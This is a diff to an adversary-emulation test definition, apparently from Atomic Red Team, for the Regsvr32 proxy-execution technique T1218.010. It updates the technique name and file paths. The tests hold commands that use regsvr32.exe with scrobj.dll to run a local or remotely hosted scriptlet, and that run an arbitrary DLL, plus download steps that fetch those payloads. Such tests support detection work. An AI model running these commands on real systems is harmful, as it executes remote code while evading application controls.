@@ -1,6 +1,6 @@
 attack_technique:
 - T1218.010
-display_name: Regsvr32
+display_name: 'Signed Binary Proxy Execution: Regsvr32'
 atomic_tests:
 - name: Regsvr32 local COM scriptlet execution
   description: |
@@ -11,7 +11,7 @@ atomic_tests:
     filename:
       description: Name of the local file, include path.
       type: Path
-      default: PathToAtomicsFolder\T1117\src\RegSvr32.sct
+      default: PathToAtomicsFolder\T1218.010\src\RegSvr32.sct
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -20,7 +20,7 @@ atomic_tests:
       if (Test-Path #{filename}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/src/RegSvr32.sct" -OutFile "#{filename}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
   executor:
     command: |
       regsvr32.exe /s /u /i:#{filename} scrobj.dll
@@ -35,7 +35,7 @@ atomic_tests:
     url:
       description: URL to hosted sct file
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
   executor:
     command: |
       regsvr32.exe /s /u /i:#{url} scrobj.dll
@@ -49,7 +49,7 @@ atomic_tests:
     dll_name:
       description: Name of DLL to Execute, DLL Should export DllRegisterServer
       type: Path
-      default: PathToAtomicsFolder\T1117\bin\AllTheThingsx86.dll
+      default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -58,7 +58,7 @@ atomic_tests:
       if (Test-Path #{dll_name}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
   executor:
     command: |
       IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
